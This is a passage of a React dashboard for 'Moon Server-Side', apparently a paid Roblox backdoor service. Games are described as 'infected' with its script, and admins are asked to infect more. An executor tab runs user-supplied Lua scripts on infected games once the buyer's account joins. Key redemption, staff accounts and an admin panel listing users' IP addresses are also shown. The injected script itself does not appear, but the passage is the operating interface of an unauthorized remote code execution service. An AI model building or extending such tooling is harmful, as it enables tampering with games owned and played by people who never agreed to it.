                  className="flex-1 rounded-lg bg-primary px-4 py-2.5 text-sm font-medium text-primary-foreground hover:bg-primary/90 transition-all disabled:opacity-50"
                >
                  {gameModal.game ? "Save Changes" : "Add Game"}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Staff Modal - Owner Only */}
      {staffModal && isOwner && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
          <div className="relative w-full max-w-md glass-strong rounded-2xl border border-border/50 p-6">
            <button
              onClick={() => { setStaffModal(false); setNewStaffUsername(""); setNewStaffPassword(""); setNewStaffEmail(""); }}
              className="absolute top-4 right-4 p-1 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted/50 transition-colors"
            >
              <X className="h-5 w-5" />
            </button>

            <div className="flex items-center gap-3 mb-6">
              <div className="h-10 w-10 rounded-lg bg-primary/20 flex items-center justify-center">
                <UserPlus className="h-5 w-5 text-primary" />
              </div>
              <div>
                <h2 className="font-bold text-foreground">Create Staff Account</h2>
                <p className="text-sm text-muted-foreground">Limited admin access</p>
              </div>
            </div>

            <div className="space-y-4">
              <div>
                <label className="text-sm font-medium text-foreground">Username</label>
                <input
                  type="text"
                  value={newStaffUsername}
                  onChange={(e) => setNewStaffUsername(e.target.value)}
                  className="w-full mt-2 rounded-lg border border-border bg-secondary/50 px-4 py-3 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50"
                  placeholder="Staff username"
                />
              </div>

              <div>
                <label className="text-sm font-medium text-foreground">Email</label>
                <input
                  type="email"
                  value={newStaffEmail}
                  onChange={(e) => setNewStaffEmail(e.target.value)}
                  className="w-full mt-2 rounded-lg border border-border bg-secondary/50 px-4 py-3 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50"
                  placeholder="staff@example.com"
                />
              </div>

              <div>
                <label className="text-sm font-medium text-foreground">Password</label>
                <input
                  type="text"
                  value={newStaffPassword}
                  onChange={(e) => setNewStaffPassword(e.target.value)}
                  className="w-full mt-2 rounded-lg border border-border bg-secondary/50 px-4 py-3 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50"
                  placeholder="Password"
                />
              </div>

              <div className="rounded-lg border border-yellow-500/30 bg-yellow-500/10 p-3">
                <p className="text-xs text-yellow-500">Staff accounts can view users, blacklist users, and force logout - but cannot modify games.</p>
              </div>

              <div className="flex gap-3">
                <button
                  onClick={() => { setStaffModal(false); setNewStaffUsername(""); setNewStaffPassword(""); setNewStaffEmail(""); }}
                  className="flex-1 rounded-lg border border-border bg-secondary px-4 py-2.5 text-sm font-medium text-foreground hover:bg-secondary/80 transition-all"
                >
                  Cancel
                </button>
                <button
                  onClick={handleCreateStaff}
                  className="flex-1 rounded-lg bg-primary px-4 py-2.5 text-sm font-medium text-primary-foreground hover:bg-primary/90 transition-all"
                >
                  Create Staff
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Sidebar */}
      <aside className="w-64 glass-strong border-r border-border/30 flex flex-col">
        <div className="p-6 border-b border-border/30">
          <Link href="/" className="flex flex-col items-center gap-2">
            <h1 className="text-3xl font-black tracking-wider">
              <span className="text-primary">MOON</span>
            </h1>
            <span className={`px-4 py-1 rounded-full text-xs font-bold uppercase tracking-wider ${
              isAdmin 
                ? "bg-primary/20 text-primary border border-primary/30" 
                : userPlan === "premium" 
                  ? "bg-primary/20 text-primary border border-primary/30"
                  : userPlan === "standard"
                    ? "bg-green-500/20 text-green-400 border border-green-500/30"
                    : "bg-muted text-muted-foreground border border-border/30"
            }`}>
              Plan: {isAdmin ? user.role : userPlan === "none" ? "None" : userPlan}
            </span>
          </Link>
        </div>

        <nav className="flex-1 p-4 space-y-1">
          {sidebarItems.map((item) => (
            <button
              key={item.id}
              onClick={() => setActiveTab(item.id)}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-lg text-sm font-medium transition-all ${
                activeTab === item.id
                  ? "bg-primary text-primary-foreground shadow-lg shadow-primary/25"
                  : "text-muted-foreground hover:text-foreground hover:bg-muted/50"
              }`}
            >
              <item.icon className="h-5 w-5" />
              {item.label}
              {activeTab === item.id && <ChevronRight className="h-4 w-4 ml-auto" />}
            </button>
          ))}
        </nav>

        <div className="p-4 border-t border-border/30">
          <div className="flex items-center gap-3 px-4 py-3 rounded-lg bg-secondary/50">
            <div className="h-10 w-10 rounded-full overflow-hidden bg-primary/20 flex items-center justify-center">
              {user.avatar ? (
                <img src={user.avatar} alt="Profile" className="h-full w-full object-cover" />
              ) : isOwner ? (
                <Crown className="h-5 w-5 text-primary" />
              ) : isStaff ? (
                <Shield className="h-5 w-5 text-accent" />
              ) : (
                <span className="text-sm font-bold text-primary">
                  {user.username.charAt(0).toUpperCase()}
                </span>
              )}
            </div>
            <div className="flex-1 min-w-0">
              <p className="text-sm font-semibold text-foreground truncate">{user.username}</p>
              <p className="text-xs text-muted-foreground capitalize">
                {isAdmin ? user.role : userPlan === "none" ? "No Plan" : userPlan}
              </p>
            </div>
            <button
              onClick={handleLogout}
              className="p-2 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted/50 transition-colors"
              title="Logout"
            >
              <LogOut className="h-4 w-4" />
            </button>
          </div>
        </div>
      </aside>

      {/* Main */}
      <main className="flex-1 flex flex-col">
        <header className="h-16 glass-strong border-b border-border/30 flex items-center justify-between px-6">
          <div className="flex items-center gap-4">
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
              <input
                type="text"
                placeholder="Search..."
                className="w-64 rounded-lg border border-border bg-secondary/50 pl-10 pr-4 py-2 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50"
              />
            </div>
          </div>
          <div className="flex items-center gap-3">
            {userPlan !== "none" && !isAdmin && (
              <span className={`px-3 py-1 rounded-full text-xs font-semibold ${
                userPlan === "premium" ? "bg-gradient-to-r from-primary to-accent text-white" : "bg-secondary text-foreground"
              }`}>
                {userPlan.charAt(0).toUpperCase() + userPlan.slice(1)}
              </span>
            )}
            <button className="relative p-2 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted/50 transition-colors">
              <Bell className="h-5 w-5" />
              <span className="absolute top-1 right-1 h-2 w-2 rounded-full bg-primary" />
            </button>
          </div>
        </header>

        <div className="flex-1 overflow-auto p-6">
          {/* Home Tab */}
          {activeTab === "home" && (
            <div className="space-y-6">
              <div>
                <h2 className="text-2xl font-bold text-foreground">Welcome back, {user.username}!</h2>
                <p className="text-muted-foreground mt-1">{"Here's what's happening with Moon Server-Side."}</p>
              </div>

              {!hasAccess && (
                <div className="rounded-xl border border-yellow-500/30 bg-yellow-500/10 p-4 flex items-start gap-3">
                  <AlertTriangle className="h-5 w-5 text-yellow-500 flex-shrink-0 mt-0.5" />
                  <div>
                    <p className="font-semibold text-yellow-500">No Active Plan</p>
                    <p className="text-sm text-yellow-500/80 mt-1">
                      You need to purchase a plan and verify your Roblox account in the Whitelist tab to access games.
                    </p>
                    <button
                      onClick={() => setActiveTab("whitelist")}
                      className="mt-3 inline-flex items-center gap-2 rounded-lg bg-yellow-500 px-4 py-2 text-sm font-semibold text-black hover:bg-yellow-400 transition-all"
                    >
                      <Key className="h-4 w-4" />
                      Go to Whitelist
                    </button>
                  </div>
                </div>
              )}

              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
                {[
                  { label: "Games Available", value: `${games.length}+`, icon: Gamepad2, color: "text-primary" },
                  { label: "Total Players", value: formatPlayers(games.reduce((acc, g) => acc + g.players, 0)), icon: Users, color: "text-green-500" },
                  { label: "Active Users", value: `${adminUsers.filter(u => u.isOnline).length}`, icon: Zap, color: "text-yellow-500" },
                  { label: "Uptime", value: "99.9%", icon: Clock, color: "text-accent" },
                ].map((stat, i) => (
                  <div key={i} className="glass rounded-xl p-5 border border-border/30">
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-sm text-muted-foreground">{stat.label}</p>
                        <p className="text-2xl font-bold text-foreground mt-1">{stat.value}</p>
                      </div>
                      <div className={`p-3 rounded-lg bg-muted/50 ${stat.color}`}>
                        <stat.icon className="h-6 w-6" />
                      </div>
                    </div>
                  </div>
                ))}
              </div>

              <div>
                <h3 className="text-lg font-semibold text-foreground mb-4">Quick Actions</h3>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <button
                    onClick={() => setActiveTab("games")}
                    className="glass rounded-xl p-5 border border-border/30 text-left group hover:border-primary/50 transition-all"
                  >
                    <div className="flex items-center gap-4">
                      <div className="p-3 rounded-lg bg-primary/10 text-primary group-hover:bg-primary group-hover:text-primary-foreground transition-all">
                        <Gamepad2 className="h-6 w-6" />
                      </div>
                      <div>
                        <p className="font-semibold text-foreground">Browse Games</p>
                        <p className="text-sm text-muted-foreground">{games.length}+ supported</p>
                      </div>
                    </div>
                  </button>
                  <button
                    onClick={() => setActiveTab("whitelist")}
                    className="glass rounded-xl p-5 border border-border/30 text-left group hover:border-primary/50 transition-all"
                  >
                    <div className="flex items-center gap-4">
                      <div className="p-3 rounded-lg bg-green-500/10 text-green-500 group-hover:bg-green-500 group-hover:text-white transition-all">
                        <Key className="h-6 w-6" />
                      </div>
                      <div>
                        <p className="font-semibold text-foreground">Whitelist</p>
                        <p className="text-sm text-muted-foreground">Verify your plan</p>
                      </div>
                    </div>
                  </button>
                  {isAdmin && (
                    <button
                      onClick={() => setActiveTab("admin")}
                      className="glass rounded-xl p-5 border border-border/30 text-left group hover:border-primary/50 transition-all"
                    >
                      <div className="flex items-center gap-4">
                        <div className="p-3 rounded-lg bg-accent/10 text-accent group-hover:bg-accent group-hover:text-white transition-all">
                          <Shield className="h-6 w-6" />
                        </div>
                        <div>
                          <p className="font-semibold text-foreground">Admin Panel</p>
                          <p className="text-sm text-muted-foreground">Manage users & games</p>
                        </div>
                      </div>
                    </button>
                  )}
                </div>
              </div>
            </div>
          )}

          {/* Games Tab */}
          {activeTab === "games" && (
            <div className="space-y-6">
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-2xl font-bold text-foreground">Supported Games</h2>
                  <p className="text-muted-foreground mt-1">Browse and join games with Moon Server-Side</p>
                </div>
                <button
                  onClick={refreshGameData}
                  className="inline-flex items-center gap-2 rounded-lg border border-border bg-secondary px-4 py-2 text-sm font-medium text-foreground hover:bg-secondary/80 transition-all"
                >
                  <RefreshCw className="h-4 w-4" />
                  Refresh
                </button>
              </div>

              {!hasAccess && (
                <div className="rounded-xl border border-destructive/30 bg-destructive/10 p-4 flex items-start gap-3">
                  <Lock className="h-5 w-5 text-destructive flex-shrink-0 mt-0.5" />
                  <div>
                    <p className="font-semibold text-destructive">Games Locked</p>
                    <p className="text-sm text-destructive/80 mt-1">
                      You need an active plan to access games. Purchase a gamepass and verify in the Whitelist tab.
                    </p>
                  </div>
                </div>
              )}

              {games.length === 0 ? (
                <div className="glass rounded-xl border border-border/30 p-12 text-center animate-fade-in">
                  <Gamepad2 className="h-16 w-16 text-muted-foreground mx-auto mb-4" />
                  <h3 className="text-xl font-semibold text-foreground mb-2">No Games Infected Yet</h3>
                  <p className="text-muted-foreground max-w-md mx-auto">
                    Games will appear here when they are infected with the Moon Server-Side script. 
                    Check back later or ask an admin to infect a game.
                  </p>
                </div>
              ) : (
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                  {games.map((game, index) => (
                    <div
                      key={game.id}
                      className={`glass rounded-xl border border-border/30 overflow-hidden group hover:border-primary/50 transition-all relative animate-fade-in ${
                        !hasAccess ? "pointer-events-none" : ""
                      }`}
                      style={{ animationDelay: `${index * 50}ms` }}
                    >
                      {!hasAccess && (
                        <div className="absolute inset-0 z-10 backdrop-blur-md bg-background/50 flex items-center justify-center">
                          <Lock className="h-8 w-8 text-muted-foreground" />
                        </div>
                      )}
                      <div className="aspect-video bg-muted relative overflow-hidden">
                        {game.imageUrl ? (
                          <img
                            src={game.imageUrl}
                            alt={game.name}
                            className={`w-full h-full object-cover group-hover:scale-105 transition-transform duration-300 ${
                              !hasAccess ? "blur-lg" : ""
                            }`}
                          />
                        ) : (
                          <div className="w-full h-full flex items-center justify-center bg-gradient-to-br from-primary/20 to-primary/5">
                            <Gamepad2 className="h-12 w-12 text-primary/50" />
                          </div>
                        )}
                        <div className={`absolute top-2 right-2 px-2 py-1 rounded-md text-xs font-semibold ${
                          game.status === "online" ? "bg-green-500/90 text-white" :
                          game.status === "maintenance" ? "bg-yellow-500/90 text-black" :
                          "bg-destructive/90 text-white"
                        }`}>
                          {game.status}
                        </div>
                      </div>
                      <div className="p-4">
                        <h3 className={`font-semibold text-foreground ${!hasAccess ? "blur-sm" : ""}`}>
                          {hasAccess ? game.name : "Locked Game"}
                        </h3>
                        <p className="text-sm text-muted-foreground flex items-center gap-1 mt-1">
                          <Users className="h-3 w-3" />
                          {formatPlayers(game.players)} playing
                        </p>
                        {hasAccess && game.placeId && (
                          <a
                            href={`https://www.roblox.com/games/${game.placeId}`}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="mt-3 w-full inline-flex items-center justify-center gap-2 rounded-lg bg-primary px-4 py-2 text-sm font-semibold text-primary-foreground hover:bg-primary/90 transition-all"
                          >
                            <Play className="h-4 w-4" />
                            Join Game
                          </a>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* Executor Tab */}
          {activeTab === "executor" && (
            <div className="space-y-6">
              <div>
                <h2 className="text-2xl font-bold text-foreground">Script Executor</h2>
                <p className="text-muted-foreground mt-1">Execute scripts on infected games</p>
              </div>

              {/* Script Editor - Always show */}
              <div className="glass rounded-xl border border-border/30 p-4">
                <label className="block text-sm font-medium text-foreground mb-2">Script</label>
                <textarea
                  value={scriptInput}
                  onChange={(e) => setScriptInput(e.target.value)}
                  placeholder="Enter your Lua script here..."
                  className="w-full h-48 px-4 py-3 rounded-lg bg-secondary border border-border/30 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50 font-mono text-sm resize-none"
                />
              </div>

              {/* Action Buttons */}
              <div className="flex gap-3">
                <button
                  onClick={() => executeScript()}
                  disabled={executorLoading}
                  className="flex-1 py-3 rounded-lg bg-primary text-primary-foreground font-semibold hover:bg-primary/90 transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                >
                  {executorLoading ? <Loader2 className="h-5 w-5 animate-spin" /> : <Play className="h-5 w-5" />}
                  Execute
                </button>
                <button
                  onClick={() => setScriptInput("")}
                  className="px-6 py-3 rounded-lg bg-secondary border border-border/30 text-foreground font-semibold hover:bg-secondary/80 transition-all"
                >
                  Clear
                </button>
                <button
                  onClick={() => executeScript("r6")}
                  disabled={executorLoading}
                  className="px-6 py-3 rounded-lg bg-green-500/20 border border-green-500/30 text-green-400 font-semibold hover:bg-green-500/30 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  R6
                </button>
              </div>

              {/* Status Info */}
              {user?.robloxUsername && hasAccess && (
                <div className="glass rounded-xl border border-green-500/30 p-4 bg-green-500/5">
                  <div className="flex items-center gap-3">
                    <Check className="h-5 w-5 text-green-500" />
                    <div>
                      <p className="text-sm text-foreground">
                        Scripts will be executed when <span className="font-semibold text-primary">{user.robloxUsername}</span> is found in an infected game.
                      </p>
                    </div>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* Whitelist Tab */}
          {activeTab === "whitelist" && (
            <div className="space-y-6 max-w-2xl">
              <div>
                <h2 className="text-2xl font-bold text-foreground">Whitelist</h2>
                <p className="text-muted-foreground mt-1">Redeem your key and link your Roblox account</p>
              </div>

              {/* Status Card */}
              <div className="glass rounded-xl border border-border/30 p-6">
                <div className="flex items-center gap-4">
                  <div className={`h-14 w-14 rounded-full flex items-center justify-center ${
                    user.robloxUsername && userPlan !== "none" 
                      ? "bg-green-500/20" 
                      : userPlan !== "none"
                        ? "bg-yellow-500/20" 
                        : "bg-muted"
                  }`}>
                    {user.robloxUsername && userPlan !== "none" ? (
                      <Check className="h-7 w-7 text-green-500" />
                    ) : userPlan !== "none" ? (
                      <AlertTriangle className="h-7 w-7 text-yellow-500" />
                    ) : (
                      <Key className="h-7 w-7 text-muted-foreground" />
                    )}
                  </div>
                  <div>
                    <h3 className="font-semibold text-foreground">
                      {user.robloxUsername && userPlan !== "none" 
                        ? "Fully Verified" 
                        : userPlan !== "none"
                          ? "Need Roblox Link" 
                          : "Need Key"}
                    </h3>
                    <p className="text-sm text-muted-foreground">
                      Plan: <span className={`font-semibold ${
                        userPlan === "premium" ? "text-primary" : userPlan === "standard" ? "text-green-500" : "text-destructive"
                      }`}>
                        {userPlan === "none" ? "No Active Plan" : userPlan.charAt(0).toUpperCase() + userPlan.slice(1)}
                      </span>
                    </p>
                    {user.robloxUsername && (
                      <p className="text-sm text-muted-foreground">
                        Roblox: <span className="text-primary font-medium">{user.robloxUsername}</span>
                      </p>
                    )}
                  </div>
                </div>
              </div>

              {/* Step 1: Redeem Key */}
              <div className="glass rounded-xl border border-border/30 p-6">
                <div className="flex items-center gap-3 mb-4">
                  <div className={`h-8 w-8 rounded-full flex items-center justify-center text-sm font-bold ${
                    userPlan !== "none" ? "bg-green-500/20 text-green-500" : "bg-primary/20 text-primary"
                  }`}>
                    {userPlan !== "none" ? <Check className="h-4 w-4" /> : "1"}
                  </div>
                  <h3 className="font-semibold text-foreground">Redeem Key</h3>
                </div>
                
                {userPlan !== "none" ? (
                  <p className="text-sm text-green-500">
                    {userPlan.charAt(0).toUpperCase() + userPlan.slice(1)} plan active
                  </p>
                ) : (
                  <div className="space-y-3">
                    <input
                      type="text"
                      value={keyInput}
                      onChange={(e) => setKeyInput(e.target.value.toUpperCase())}
                      placeholder="Enter your key (e.g., MOON-PREMIUM-...)"
                      className="w-full px-4 py-3 rounded-lg bg-secondary border border-border/30 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50 font-mono"
                    />
                    <button
                      onClick={redeemKey}
                      disabled={whitelistLoading || !keyInput.trim()}
                      className="w-full py-3 rounded-lg bg-green-500 text-white font-semibold hover:bg-green-600 transition-all disabled:opacity-50"
                    >
                      {whitelistLoading ? <Loader2 className="h-5 w-5 animate-spin mx-auto" /> : "Redeem Key"}
                    </button>
                  </div>
                )}
              </div>

              {/* Step 2: Link Roblox - Only show if key is redeemed */}
              {userPlan !== "none" && (
                <div className="glass rounded-xl border border-border/30 p-6">
                  <div className="flex items-center gap-3 mb-4">
                    <div className={`h-8 w-8 rounded-full flex items-center justify-center text-sm font-bold ${
                      user.robloxUsername ? "bg-green-500/20 text-green-500" : "bg-primary/20 text-primary"
                    }`}>
                      {user.robloxUsername ? <Check className="h-4 w-4" /> : "2"}
                    </div>
                    <h3 className="font-semibold text-foreground">Link Roblox Account</h3>
                  </div>
                  
                  {user.robloxUsername ? (
                    <p className="text-sm text-green-500">Linked to: {user.robloxUsername}</p>
                  ) : (
                    <div className="space-y-3">
                      <input
                        type="text"
                        value={robloxInput}
                        onChange={(e) => setRobloxInput(e.target.value)}
                        placeholder="Enter your Roblox username"
                        className="w-full px-4 py-3 rounded-lg bg-secondary border border-border/30 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50"
                      />
                      <button
                        onClick={handleLinkRoblox}
                        disabled={whitelistLoading || !robloxInput.trim()}
                        className="w-full py-3 rounded-lg bg-primary text-primary-foreground font-semibold hover:bg-primary/90 transition-all disabled:opacity-50"
                      >
                        {whitelistLoading ? <Loader2 className="h-5 w-5 animate-spin mx-auto" /> : "Link Account"}
                      </button>
                    </div>
                  )}
                </div>
              )}

              {/* Messages */}
              {whitelistError && (
                <div className="rounded-lg border border-destructive/30 bg-destructive/10 p-4">
                  <p className="text-sm text-destructive">{whitelistError}</p>
                </div>
              )}
              {whitelistSuccess && (
                <div className="rounded-lg border border-green-500/30 bg-green-500/10 p-4">
                  <p className="text-sm text-green-500">{whitelistSuccess}</p>
                </div>
              )}
            </div>
          )}



          {/* ToS Tab */}
          {activeTab === "tos" && (
            <div className="space-y-6 max-w-3xl">
              <div>
                <h2 className="text-2xl font-bold text-foreground">Terms of Service</h2>
                <p className="text-muted-foreground mt-1">By using Moon, you agree to follow these rules</p>
              </div>

              {/* Standard ToS */}
              <div className="glass rounded-xl border border-border/30 p-6">
                <div className="flex items-center gap-3 mb-4">
                  <div className="h-10 w-10 rounded-lg bg-green-500/20 flex items-center justify-center">
                    <FileText className="h-5 w-5 text-green-500" />
                  </div>
                  <div>
                    <h3 className="font-bold text-foreground">Standard Plan Rules</h3>
                    <p className="text-sm text-muted-foreground">Strict ToS for Standard users</p>
                  </div>
                </div>
                <ul className="space-y-2">
                  {STANDARD_TOS.map((rule, i) => (
                    <li key={i} className="flex items-start gap-3 text-sm text-muted-foreground">
                      <span className="text-destructive mt-0.5">*</span>
                      {rule}
                    </li>
                  ))}
                </ul>
              </div>

              {/* Premium ToS */}
              <div className="glass rounded-xl border border-primary/30 p-6">
                <div className="flex items-center gap-3 mb-4">
                  <div className="h-10 w-10 rounded-lg bg-primary/20 flex items-center justify-center">
                    <Crown className="h-5 w-5 text-primary" />
                  </div>
                  <div>
                    <h3 className="font-bold text-foreground">Premium Plan Rules</h3>
                    <p className="text-sm text-muted-foreground">Relaxed ToS for Premium users</p>
                  </div>
                </div>
                <ul className="space-y-2">
                  {PREMIUM_TOS.map((rule, i) => (
                    <li key={i} className="flex items-start gap-3 text-sm text-muted-foreground">
                      <span className="text-primary mt-0.5">*</span>
                      {rule}
                    </li>
                  ))}
                </ul>
              </div>

              <div className="rounded-xl border border-yellow-500/30 bg-yellow-500/10 p-4">
                <p className="text-sm text-yellow-500">
                  <strong>Warning:</strong> Breaking these rules may result in an instant blacklist. If you believe you were blacklisted unfairly, you can appeal in our Discord server.
                </p>
              </div>
            </div>
          )}

          {/* Settings Tab */}
          {activeTab === "settings" && (
            <div className="space-y-6 max-w-2xl">
              <div>
                <h2 className="text-2xl font-bold text-foreground">Settings</h2>
                <p className="text-muted-foreground mt-1">Manage your account settings</p>
              </div>

              {/* Color Theme */}
              <div className="glass rounded-xl border border-border/30 p-6">
                <div className="flex items-center gap-3 mb-4">
                  <Palette className="h-5 w-5 text-primary" />
                  <h3 className="font-semibold text-foreground">Color Theme</h3>
                </div>
                <div className="grid grid-cols-3 sm:grid-cols-6 gap-3">
                  {themes.map((theme) => (
                    <button
                      key={theme.id}
                      onClick={() => changeTheme(theme.id)}
                      className={`flex flex-col items-center gap-2 p-3 rounded-lg border transition-all ${
                        colorTheme === theme.id 
                          ? "border-primary bg-primary/10" 
                          : "border-border/30 hover:border-border/60"
                      }`}
                    >
                      <div className={`h-8 w-8 rounded-full ${theme.color}`} />
                      <span className="text-xs text-foreground">{theme.label}</span>
                    </button>
                  ))}
                </div>
              </div>

              {/* Profile Picture */}
              <div className="glass rounded-xl border border-border/30 p-6">
                <h3 className="font-semibold text-foreground mb-4">Profile Picture</h3>
                <div className="flex items-center gap-6">
                  <div className="relative group">
                    <div className="h-24 w-24 rounded-full overflow-hidden bg-secondary border-2 border-border/50">
                      {user.avatar ? (
                        <img 
                          src={user.avatar} 
                          alt="Profile" 
                          className="h-full w-full object-cover"
                        />
                      ) : (
                        <div className="h-full w-full flex items-center justify-center bg-primary/20">
                          {isOwner ? (
                            <Crown className="h-10 w-10 text-primary" />
                          ) : isStaff ? (
                            <Shield className="h-10 w-10 text-accent" />
                          ) : (
                            <span className="text-3xl font-bold text-primary">
                              {user.username.charAt(0).toUpperCase()}
                            </span>
                          )}
                        </div>
                      )}
                    </div>
                    <label className="absolute inset-0 flex items-center justify-center bg-black/60 rounded-full opacity-0 group-hover:opacity-100 transition-opacity cursor-pointer">
                      {avatarUploading ? (
                        <Loader2 className="h-6 w-6 text-white animate-spin" />
                      ) : (
                        <Camera className="h-6 w-6 text-white" />
                      )}
                      <input
                        type="file"
                        accept="image/*"
                        onChange={handleAvatarUpload}
                        className="hidden"
                        disabled={avatarUploading}
                      />
                    </label>
                  </div>
                  <div>
                    <p className="text-sm text-foreground font-medium">Change your profile picture</p>
                    <p className="text-xs text-muted-foreground mt-1">JPG, PNG or GIF. Max 2MB.</p>
                  </div>
                </div>
              </div>

              <div className="glass rounded-xl border border-border/30 p-6">
                <h3 className="font-semibold text-foreground mb-4">Account Information</h3>
                <div className="space-y-4">
                  <div className="flex items-center justify-between py-3 border-b border-border/30">
                    <div>
                      <p className="text-sm text-muted-foreground">Username</p>
                      <p className="font-medium text-foreground">{user.username}</p>
                    </div>
                    {isOwner && <Crown className="h-5 w-5 text-primary" />}
                    {isStaff && <Shield className="h-5 w-5 text-accent" />}
                  </div>
                  <div className="flex items-center justify-between py-3 border-b border-border/30">
                    <div>
                      <p className="text-sm text-muted-foreground">Email</p>
                      <p className="font-medium text-foreground">{user.email || "Not set"}</p>
                    </div>
                  </div>
                  <div className="flex items-center justify-between py-3 border-b border-border/30">
                    <div>
                      <p className="text-sm text-muted-foreground">Role</p>
                      <p className="font-medium text-foreground capitalize">{user.role}</p>
                    </div>
                  </div>
                  <div className="flex items-center justify-between py-3 border-b border-border/30">
                    <div>
                      <p className="text-sm text-muted-foreground">Plan</p>
                      <p className={`font-medium ${
                        userPlan === "premium" ? "text-primary" : userPlan === "standard" ? "text-green-500" : "text-destructive"
                      }`}>
                        {userPlan === "none" ? "No Active Plan" : userPlan.charAt(0).toUpperCase() + userPlan.slice(1)}
                      </p>
                    </div>
                  </div>
                  <div className="flex items-center justify-between py-3">
                    <div>
                      <p className="text-sm text-muted-foreground">Roblox Account</p>
                      <p className="font-medium text-foreground">{user.robloxUsername || "Not linked"}</p>
                    </div>
                    {user.robloxUsername && <Check className="h-5 w-5 text-green-500" />}
                  </div>
                </div>
              </div>

              <button
                onClick={handleLogout}
                className="inline-flex items-center gap-2 rounded-lg bg-destructive px-6 py-3 text-sm font-semibold text-white hover:bg-destructive/90 transition-all"
              >
                <LogOut className="h-4 w-4" />
                Sign Out
              </button>
            </div>
          )}

          {/* Admin Tab */}
          {activeTab === "admin" && isAdmin && (
            <div className="space-y-6">
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-2xl font-bold text-foreground">Admin Panel</h2>
                  <p className="text-muted-foreground mt-1">Manage users, blacklist, and games</p>
                </div>
                <button
                  onClick={fetchAdminData}
                  disabled={loading}
                  className="inline-flex items-center gap-2 rounded-lg border border-border bg-secondary px-4 py-2 text-sm font-medium text-foreground hover:bg-secondary/80 transition-all disabled:opacity-50"
                >
                  <RefreshCw className={`h-4 w-4 ${loading ? "animate-spin" : ""}`} />
                  Refresh
                </button>
              </div>

              {/* Admin tabs */}
              <div className="flex gap-2 border-b border-border/30 pb-2">
{[
                  { id: "users", label: "Users", icon: Users },
                  { id: "blacklist", label: "Blacklist", icon: UserX },
                  { id: "logs", label: "Script Logs", icon: ScrollText },
                  ...(isOwner ? [{ id: "keys", label: "Keys", icon: Key }] : []),
                  ...(isOwner ? [{ id: "webhooks", label: "Webhooks", icon: Globe }] : []),
                  ...(isOwner ? [{ id: "staff", label: "Staff", icon: Shield }] : []),
                ].map((tab) => (
                  <button
                    key={tab.id}
                    onClick={() => setAdminTab(tab.id as typeof adminTab)}
                    className={`inline-flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium transition-all ${
                      adminTab === tab.id
                        ? "bg-primary text-primary-foreground"
                        : "text-muted-foreground hover:text-foreground hover:bg-muted/50"
                    }`}
                  >
                    <tab.icon className="h-4 w-4" />
                    {tab.label}
                  </button>
                ))}
              </div>

              {/* Users */}
              {adminTab === "users" && (
                <div className="glass rounded-xl border border-border/30 overflow-hidden">
                  <div className="overflow-x-auto">
                    <table className="w-full">
                      <thead>
                        <tr className="border-b border-border/30 bg-muted/30">
                          <th className="text-left p-4 text-sm font-semibold text-foreground">User</th>
                          <th className="text-left p-4 text-sm font-semibold text-foreground">Role</th>
                          <th className="text-left p-4 text-sm font-semibold text-foreground">Plan</th>
                          <th className="text-left p-4 text-sm font-semibold text-foreground">IP</th>
                          <th className="text-left p-4 text-sm font-semibold text-foreground">Status</th>
                          <th className="text-left p-4 text-sm font-semibold text-foreground">Actions</th>
                        </tr>
                      </thead>
                      <tbody>
                        {adminUsers.map((u) => (
                          <tr key={u.id} className="border-b border-border/30 last:border-0">
                            <td className="p-4">
                              <div className="flex items-center gap-3">
                                <div className="h-8 w-8 rounded-full bg-primary/20 flex items-center justify-center">
                                  {u.role === "owner" ? (
                                    <Crown className="h-4 w-4 text-primary" />
                                  ) : u.role === "staff" ? (
                                    <Shield className="h-4 w-4 text-accent" />
                                  ) : (
                                    <span className="text-xs font-bold text-primary">{u.username.charAt(0).toUpperCase()}</span>
                                  )}
                                </div>
                                <div>
                                  <p className="font-medium text-foreground">{u.username}</p>
                                  <p className="text-xs text-muted-foreground">{u.email}</p>
                                </div>
                              </div>
                            </td>
                            <td className="p-4">
                              <span className={`px-2 py-1 rounded text-xs font-medium ${
                                u.role === "owner" ? "bg-primary/20 text-primary" :
                                u.role === "staff" ? "bg-accent/20 text-accent" :
                                "bg-muted text-muted-foreground"
                              }`}>
                                {u.role}
                              </span>
                            </td>
                            <td className="p-4">
                              <span className={`px-2 py-1 rounded text-xs font-medium ${
                                u.plan === "premium" ? "bg-primary/20 text-primary" :
                                u.plan === "standard" ? "bg-green-500/20 text-green-500" :
                                "bg-muted text-muted-foreground"
                              }`}>
                                {u.plan || "none"}
                              </span>
                            </td>
                            <td className="p-4">
                              <div className="flex items-center gap-2">
                                <code className="text-xs text-muted-foreground bg-muted px-2 py-1 rounded">{u.ip}</code>
                                <button
                                  onClick={() => copyToClipboard(u.ip, `ip-${u.id}`)}
